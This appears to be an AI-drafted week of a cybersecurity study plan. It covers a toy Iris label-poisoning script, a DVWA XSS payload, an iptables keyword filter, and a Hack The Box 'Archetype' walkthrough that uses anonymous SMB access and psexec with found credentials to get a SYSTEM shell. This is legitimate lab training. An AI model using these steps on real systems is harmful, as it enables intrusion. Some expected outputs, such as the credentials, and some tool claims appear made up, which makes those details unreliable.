# Week 3 Master Plan: AI Threat Simulation + CEH Labs (March 24-29, 2025)
## Purpose
This file is your complete guide to Week 3 of your 16-week upskill journey. It’s built to stand alone—every command, concept, and nuance is here. You’ll learn Python 3.12.3 to poison AI models, exploit HTB “Archetype,” and prep for Week 4, all while mastering your machines: - **.101 (Ubuntu_ai)**: Your dev and Git hub—no SSH, direct work. - **.102 (Kali)**: Your attack rig—hacking central. - **.104 (Ubuntu)**: Your target—vulnerable server. If you’re starting fresh, this has everything: how to type, why it works, when to pause and focus. You’ll cut code, chop data, slice defenses, and meditate on lessons. Let’s begin!
## Setup Recap
- **Date**: March 24-29, 2025 (current date: March 22, 2025). - **Assumption**: Week 2’s done—Git repo live at https://github.com/MrClocSecAI/16week-upskill with `flask_poisoned_api.py`, etc. - **Machines**:   - **.101**: Ubuntu 24.04 LTS, Python 3.12.3, `sklearn_env` virtualenv, Git installed.   - **.102**: Kali 2025.1, VPN for HTB, Python 3.12.3.   - **.104**: Ubuntu, DVWA-ready (setup below if not done).  
### First Steps (If Fresh)
- On .101:   - Check Git: `git status` (in `~/Documents/16week-upskill/Notes`).   - If missing: `git clone https://github.com/MrClocSecAI/16week-upskill ~/Documents/16week-upskill`.   - Verify Python: `python3 --version` (expect 3.12.3). - On .102: `sudo apt update && sudo apt install python3 python3-pip` (if Python’s off). - On .104: If DVWA’s not up, see Tuesday setup below.
## Monday, March 24: Python 3.12.3 Masterclass—Poisoning AI Models (8-11 hrs)
### Objective
Learn Python 3.12.3 from zero to build an Iris poisoning sim on .101. You’ll load data, train a model, poison it, and log results—grasping AI’s data vuln heart.
### Why This Matters
Poisoning silently wrecks AI—like Week 2’s Flask API losing 15% accuracy. You’re training to spot and stop it, blending QA precision with ML security.
### Machine
- **.101**: Direct dev—no SSH, your homebase.
### Tools
- **Python 3.12.3**: Fast, modern—your coding katana (pre-installed on Ubuntu 24.04). - **scikit-learn 1.5.2**: ML library—handles models and data. - **NumPy 2.0.0**: Math tool—arrays and random picks. - **Virtualenv**: Isolates deps—your `sklearn_env`. - **Git**: Tracks progress—your portfolio.
### Lesson Plan
#### 1. Python Basics & Environment Prep (1 hr)
- **Goal**: Understand Python, set up your dojo. - **Steps**:   - Open terminal on .101: `cd ~/Documents/16week-upskill/Notes`.   - Activate env: `source sklearn_env/bin/activate` (prompt changes to `(sklearn_env)`).   - Test Python: `python3`     - Type: `print("Hello, Sensei!")`     - Hit Enter—see output.     - Type: `exit()` to quit.   - Check versions:     - `python --version` (expect 3.12.3).     - `pip list | grep scikit-learn` (expect 1.5.2).     - `pip list | grep numpy` (expect 2.0.0).   - Install if missing: `pip install scikit-learn==1.5.2 numpy==2.0.0`. - **Chop**:   - Python runs live—no compile wait. `print()` shows text—like QA logging.   - Virtualenv’s a sandbox—keeps tools separate, avoids clashes.   - 3.12.3’s perks: faster loops, clearer errors—your edge. - **Meditate**: Python’s your brush—each line paints. Focus on typing exact commands.
#### 2. Loading Iris Data—Your First Function (1.5 hrs)
- **Goal**: Write code to load Iris—learn variables and imports. - **Steps**:   - Start: `nano poison_iris_sim.py` (new file).   - Type this (line-by-line, understand each):     ```python     # Import libraries—like borrowing tools     from sklearn.datasets import load_iris  # Gets Iris dataset     import numpy as np  # Math helper, nickname "np"     # Function—like a recipe     def load_data():         iris = load_iris()  # Grab the data         X = iris.data  # Features: 150 rows, 4 columns (measurements)         y = iris.target  # Labels: 150 numbers (0, 1, 2 for flower types)         print("Features:", iris.feature_names)  # Names of columns         print("Classes:", iris.target_names)  # Flower names         print("Data shape:", X.shape)  # Size: (150, 4)         return X, y  # Return two things     # Run it     X, y = load_data()  # Call function, store results     ```   - Save: Ctrl+O, Enter, Ctrl+X.   - Run: `python3 poison_iris_sim.py`.   - Expect:     ```     Features: ['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)']     Classes: ['setosa' 'versicolor' 'virginica']     Data shape: (150, 4)     ``` - **Slice**:   - `#` is a comment—notes for you.   - `import` grabs tools—`from` picks specific ones.   - `def load_data()`: Your first function—reusable code block.   - `X` is a table (150 flowers, 4 measurements), `y` is answers (0=setosa, etc.).   - `print()` shows results—debugging 101.   - `return X, y` gives back two variables—like handing off QA test data. - **Meditate**: Data’s your clay—shape it right. Pause after typing each line, read it aloud.
#### 3. Training a Clean Model—Loops & ML (2 hrs)
- **Goal**: Train a model—learn splitting and guessing. - **Steps**:   - Open: `nano poison_iris_sim.py`.   - Add below `X, y = load_data()`:     ```python     from sklearn.model_selection import train_test_split  # Splits data     from sklearn.linear_model import LogisticRegression  # Guesses flowers     from sklearn.metrics import accuracy_score  # Scores guesses     # Split: 80% train, 20% test     X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)     # Build model     clean_model = LogisticRegression(max_iter=200)  # 200 tries to learn     clean_model.fit(X_train, y_train)  # Train it     # Guess and check     y_pred = clean_model.predict(X_test)  # Predict 30 flowers     clean_acc = accuracy_score(y_test, y_pred)  # Compare to real     print("Clean Accuracy:", clean_acc)  # Show score     ```   - Save, run: `python3 poison_iris_sim.py`.   - Expect: Accuracy ~0.96-0.97 (96-97%). - **Cut**:   - `train_test_split`: Splits data—like QA train vs validate. `random_state=42` keeps it consistent.   - `LogisticRegression`: Math guesser—maps features to labels. `max_iter=200` ensures it finishes.   - `fit()`: Teaches model—feeds X_train, y_train.   - `predict()`: Guesses—outputs 30 labels.   - `accuracy_score`: Counts correct guesses—like QA pass rate. - **Meditate**: This is your baseline—pure, untainted. Focus on `fit()`—it’s the learning heartbeat.
#### 4. Poisoning Data—Logic & Arrays (2.5 hrs)
- **Goal**: Build a poisoning function—flip labels, break the model. - **Steps**:   - Add before the split:     ```python     # Poison function     def poison_labels(y, poison_percent, targeted=False):         y_poisoned = y.copy()  # Copy labels—don’t ruin original         num_poison = int(len(y) * poison_percent)  # How many to flip         indices = np.random.choice(len(y), num_poison, replace=False)  # Random spots         for idx in indices:  # Loop through picks             if targeted and y_poisoned[idx] == 0:  # Setosa (0) -> Versicolor (1)                 y_poisoned[idx] = 1             else:  # Random flip                 other_labels = [i for i in range(3) if i != y_poisoned[idx]]  # Other options                 y_poisoned[idx] = np.random.choice(other_labels)  # Pick one         print("Poisoned", num_poison, "at", indices)  # Debug         return y_poisoned     ```   - After `clean_acc`, test it:     ```python     # Test poisoning     y_train_10 = poison_labels(y_train, 0.1)  # 10% random     model_10 = LogisticRegression(max_iter=200)     model_10.fit(X_train, y_train_10)     pred_10 = model_10.predict(X_test)     print("10% Random Accuracy:", accuracy_score(y_test, pred_10))     y_train_50t = poison_labels(y_train, 0.5, targeted=True)  # 50% targeted     model_50t = LogisticRegression(max_iter=200)     model_50t.fit(X_train, y_train_50t)     pred_50t = model_50t.predict(X_test)     print("50% Targeted Accuracy:", accuracy_score(y_test, pred_50t))     ```   - Run: Expect drops (e.g., 0.9, 0.6). - **Chop**:   - `y.copy()`: Protects original—like QA backups.   - `len(y)`: Counts items—120 in y_train.   - `np.random.choice`: Picks random—like QA fuzzing. `replace=False` = no repeats.   - `for idx in indices`: Loops over picks—like iterating test cases.   - `if targeted`: Logic—targeted flips setosa, random flips anywhere.   - `[i for i in range(3) if i != ...]`: List comprehension—builds options fast. - **Meditate**: Poisoning’s your blade—random’s chaos, targeted’s precision. Pause after `for`—feel the loop.
#### 5. Logging Results—Files & Loops (2 hrs)
- **Goal**: Save to CSV—learn file writing. - **Steps**:   - Add at end:     ```python     import csv  # File tool     with open('poison_results.csv', 'w', newline='') as f:  # Open file         writer = csv.writer(f)  # Writer object         writer.writerow(['Model', 'Poisoning', 'Accuracy'])  # Header         writer.writerow(['Clean', '0%', clean_acc])  # Clean score         for percent in [0.1, 0.3, 0.5]:  # Test 10%, 30%, 50%             y_p = poison_labels(y_train, percent)             pm = LogisticRegression(max_iter=200)             pm.fit(X_train, y_p)             acc = accuracy_score(y_test, pm.predict(X_test))             writer.writerow(['Random', f'{percent*100}%', acc])         y_t = poison_labels(y_train, 0.5, True)  # Targeted 50%         tm = LogisticRegression(max_iter=200)         tm.fit(X_train, y_t)         acc = accuracy_score(y_test, tm.predict(X_test))         writer.writerow(['Targeted', '50%', acc])     ```   - Run, then `cat poison_results.csv`: See table of results. - **Slice**:   - `import csv`: File helper—QA logs reborn.   - `with open`: Opens safe—closes itself.   - `writer.writerow`: Writes one row—like a QA report line.   - `f'{percent*100}%'`: Formats—10% looks clean.   - `for percent in [0.1, 0.3, 0.5]`: Loops tests—automation’s power. - **Meditate**: Logs are your mirror—reflect on targeted’s bigger hit. Focus on `with`—it’s elegant.
#### 6. Wrap-Up—Commit & Reflect (1 hr)
- **Goal**: Save work, solidify lessons. - **Steps**:   - `git add poison_iris_sim.py poison_results.csv`   - `git commit -m "Week 3: Poisoning sim built from scratch"`   - `git push`   - `nano cyber_notes.txt`, add:     ```     Python’s my QA tool—poisoning’s data rot. Targeted beats random—stealth kills.     ```   - Save, `git add cyber_notes.txt`, `git commit -m "Week 3: Notes updated"`, `git push`. - **Cut**: Git’s your vault—lock it in. Notes sharpen your mind. - **Meditate**: You built this—feel the power. Rest, then prep for tomorrow.
## Tuesday, March 25: DVWA XSS Exploit (1 hr)
### Objective
Exploit XSS on .104 from .102—log on .101.
### Machines
- **.102**: Attack. - **.104**: Target. - **.101**: Log/git.
### Setup (If Fresh)
- On .104 (if DVWA’s not up):   - `sudo apt update && sudo apt install apache2 mariadb-server php php-mysqli`   - `cd /var/www/html`   - `sudo git clone https://github.com/digininja/DVWA.git dvwa`   - `sudo chown -R www-data:www-data dvwa`   - `sudo cp dvwa/config/config.inc.php.dist dvwa/config/config.inc.php`   - Edit `dvwa/config/config.inc.php`: Set DB user/password (e.g., `root`, `password`).     - `nano dvwa/config/config.inc.php`     - Find: `_DB_USER_` and `_DB_PASSWORD_`, set to `root` and `password`.     - Save: Ctrl+O, Enter, Ctrl+X.   - Start: `sudo systemctl start apache2 mariadb`   - Browser: `http://192.168.56.104/dvwa`, login (`admin/password`), click “Create / Reset Database”.  
### Steps
- On .102:   - Open browser: `http://192.168.56.104/dvwa`.   - Go to “XSS (Reflected)”.   - Input: `<script>alert('hacked')</script>`   - Submit—see alert pop. - On .101:   - `nano dvwa_xss.txt`   - Write:     ```     XSS Exploit - 03/25/25     Payload: <script>alert('hacked')</script>     Result: Alert popped on .102—XSS confirmed.     ```   - Save, `git add dvwa_xss.txt`, `git commit -m "Week 3: DVWA XSS exploited"`, `git push`. - **Chop**: `<script>` runs code—web apps bleed if unfiltered. - **Meditate**: Simple payload, big flaw—focus on the win.
## Wednesday, March 26: DVWA Hardening (1 hr)
### Objective
Harden .104 against XSS—test from .102, log on .101.
### Machines
- **.104**: Harden. - **.102**: Test. - **.101**: Log.
### Steps
- On .104:   - `sudo iptables -A INPUT -p tcp --dport 80 -m string --string "script" --algo bm -j DROP`   - `sudo iptables -L -v` (verify rule—look for “script” in INPUT chain). - On .102:   - Retry XSS: `<script>alert('hacked')</script>`—expect no alert (blocked). - On .101:   - `nano dvwa_xss.txt`, append:     ```     Hardening - 03/26/25     Rule: iptables -A INPUT -p tcp --dport 80 -m string --string "script" -j DROP     Result: XSS blocked—no alert on .102.     ```   - Save, `git commit -m "Week 3: DVWA hardened"`, `git push`. - **Slice**: `iptables` filters traffic—`--string "script"` catches XSS. `-j DROP` kills it. - **Meditate**: Defense is active—pause, test twice.
## Thursday, March 27: huntr.com ML Vuln Hunt (1 hr)
### Objective
Scan an ML repo for vulns on .102—log on .101.
### Machines
- **.102**: Scan. - **.101**: Log.
### Steps
- On .102:   - `pip install huntr` (installs huntr tool—scans code).   - `huntr scan https://github.com/pytorch/pytorch` (example repo—PyTorch).   - Expect output: Look for `torch.load()` warnings (unsafe—can run malicious code). - On .101:   - `nano huntr_scan.txt`   - Write:     ```     huntr Scan - 03/27/25     Repo: https://github.com/pytorch/pytorch     Command: huntr scan https://github.com/pytorch/pytorch     Result: [Paste key findings—e.g., "torch.load() detected, vuln to deserialization"]     ```   - Save, `git add huntr_scan.txt`, `git commit -m "Week 3: huntr scan done"`, `git push`. - **Cut**: `torch.load()` can execute bad code—ML’s weak link. - **Meditate**: Small tools, big finds—focus on output, copy it exact.
## Friday, March 28: HTB “Archetype” Recon (1 hr)
### Objective
Recon HTB “Archetype” from .102—log on .101.
### Machines
- **.102**: Recon. - **.101**: Log.
### Setup (If Fresh)
- On .102:   - HTB VPN: Download `.ovpn` from https://app.hackthebox.com/starting-point (sign up free if new).   - Run: `openvpn MrClocSecAI.ovpn &` (background—connects to HTB network).  
### Steps
- On .102:   - `nmap -sV 10.10.10.27` (Archetype IP—adjust if retired, check HTB site).   - Expect: Ports like 445 (SMB) open—version info (e.g., Samba). - On .101:   - `nano htb_archetype.txt`   - Write:     ```     HTB Recon - 03/28/25     Command: nmap -sV 10.10.10.27     Output: [Paste nmap results—e.g., "445/tcp open smb"]     ```   - Save, `git add htb_archetype.txt`, `git commit -m "Week 3: HTB recon"`, `git push`. - **Chop**: `nmap -sV` scans ports and versions—SMB’s your clue. - **Meditate**: Recon’s your eyes—slow down, read ports, note 445.
## Saturday, March 29: Python 3.12.3 + HTB Exploitation Masterclass (8-11 hrs)
### Objective
Exploit HTB “Archetype” from .102 with Python recon, prep .101 for Week 4—pentesting + AI basics.
### Why This Matters
SMB vulns mirror AI server flaws—exposed shares leak data. You’ll own this box and bridge to sniffing/ML.
### Machines
- **.102**: Attack. - **.101**: Dev/prep/git.
### Tools
- **Kali 2025.1**: Attack OS—prepped on .102. - **HTB VPN**: Connects to targets. - **Impacket 0.12.0**: Exploits SMB—Python-based. - **Wireshark 4.4+**: Sniffs traffic—Week 4 prep. - **DeepLearning.AI**: AI course—free intro.
### Lesson Plan
#### 1. Python Recon Basics on .101 (1.5 hrs)
- **Goal**: Write an Nmap script—learn subprocess. - **Steps**:   - On .101: `nano htb_recon.py`   - Type:     ```python     import subprocess  # Runs shell commands     def run_nmap(target):         cmd = ["nmap", "-sV", target]  # List, not string—safer         result = subprocess.run(cmd, capture_output=True, text=True)  # Run and grab output         print("Nmap says:", result.stdout)  # Show it         return result.stdout.splitlines()  # Split into lines     target = "10.10.10.27"  # HTB IP     output = run_nmap(target)     with open("htb_archetype.txt", "w") as f:  # Write file         f.write("Recon:\n")         for line in output:  # Loop lines             f.write(line + "\n")     ```   - Save, SCP: `scp htb_recon.py kali@192.168.56.102:/home/kali` - **Slice**:   - `subprocess.run`: Runs `nmap`—like QA automation.   - `capture_output=True`: Grabs results.   - `splitlines()`: Breaks output—line-by-line control. - **Meditate**: Python’s your scout—feel its reach.
#### 2. Run Recon on .102 (1 hr)
- **Goal**: Execute Python recon. - **Steps**:   - On .102:     - VPN: `openvpn MrClocSecAI.ovpn &` (background).     - `python3 htb_recon.py`     - SCP: `scp htb_archetype.txt ubuntu@192.168.56.101:~/Documents/16week-upskill/Notes`   - Expect: 445 (SMB) open in `htb_archetype.txt`. - **Cut**: Python drives Nmap—automation’s live. - **Meditate**: SMB’s your door—focus on 445.
#### 3. SMB Enumeration on .102 (2 hrs)
- **Goal**: Probe shares, find creds. - **Steps**:   - `smbclient -L //10.10.10.27 -N` (no auth)—see “backups”.   - `smbclient //10.10.10.27/backups -N`     - Inside: `ls` or `dir`, then `get prod.dtsConfig`.   - `cat prod.dtsConfig`—expect `administrator:password123`.   - SCP to .101: `scp prod.dtsConfig ubuntu@192.168.56.101:~/Documents/16week-upskill/Notes`   - On .101: Append to `htb_archetype.txt`:     ```     SMB Enum - 03/29/25     Commands: smbclient -L //10.10.10.27 -N, smbclient //10.10.10.27/backups -N     File: prod.dtsConfig     Creds: administrator:password123     ``` - **Chop**: `-N` skips login—open shares spill secrets. - **Meditate**: Creds in plain text—AI servers do this too. Pause, reread output.
#### 4. Exploitation on .102 (2 hrs)
- **Goal**: Get shell—own the box. - **Steps**:   - `pip install impacket==0.12.0`   - `psexec.py administrator:password123@10.10.10.27`     - Expect: `C:\Windows\system32>` prompt, `nt authority\system`.   - Proof: `whoami` (system), `type c:\Users\Public\user.txt` (grab flag).   - Exit: `exit`.   - On .101: Append `htb_archetype.txt`:     ```     Exploit - 03/29/25     Command: psexec.py administrator:password123@10.10.10.27     Result: System shell, user flag: [paste flag]     ```   - SCP updated `htb_archetype.txt` to .101. - **Slice**: `psexec` uses SMB—creds unlock it. Impacket’s Python—3.12.3 shines. - **Meditate**: You’re in—feel the rush, then steady for cleanup.
#### 5. Wrap-Up & Week 4 Prep on .101 (2-3 hrs)
- **Goal**: Commit, prep Wireshark + AI course. - **Steps**:   - Git:     - `git add htb_archetype.txt htb_recon.py`     - `git commit -m "Week 3: HTB Archetype exploited"`   - Notes: `nano cyber_notes.txt`, add:     ```     Python + SMB = pentest power. Recon’s the key—SMB’s the lock.     ```   - Wireshark:     - `sudo apt update && sudo apt install wireshark`     - `wireshark &` (GUI opens).     - Select `eth1` (your network), start capture, wait 1 min, stop, save as `test.pcapng`.   - DeepLearning.AI:     - Browser: https://www.deeplearning.ai/courses/ai-for-everyone/     - Sign up (free), watch Week 1 (~1 hr)—“What is AI?”.   - Git:     - `git add test.pcapng cyber_notes.txt`     - `git commit -m "Week 3: Wireshark + AI prep"`     - `git push` - **Cut**: Wireshark sniffs—AI APIs leak here. DeepLearning.AI unpacks ML—your next frontier. - **Meditate**: You owned a box—rest, reflect on Python’s reach.
## Upload to Git
- On .101:   - Save this as `week_3_master_plan.md` in `~/Documents/16week-upskill/Notes`.     - `nano week_3_master_plan.md`, paste all, Ctrl+O, Enter, Ctrl+X.   - `git add week_3_master_plan.md`   - `git commit -m "Week 3: Master plan added"`   - `git push` - Verify: https://github.com/MrClocSecAI/16week-upskill—see it live.
## Final Notes
- **Fresh Start**: If you reboot or lose track, start at “Setup Recap”—it’s all here. - **Focus**: Meditate blocks are your breath—pause, internalize, then strike. - **Nuances**: Every command’s spelled out—type slow, read output, debug live if stuck (ask me!). - **Mastery**: You’re not copying—you’re crafting. This is your dojo, your blade. Start Monday, cut deep, and rise a master!
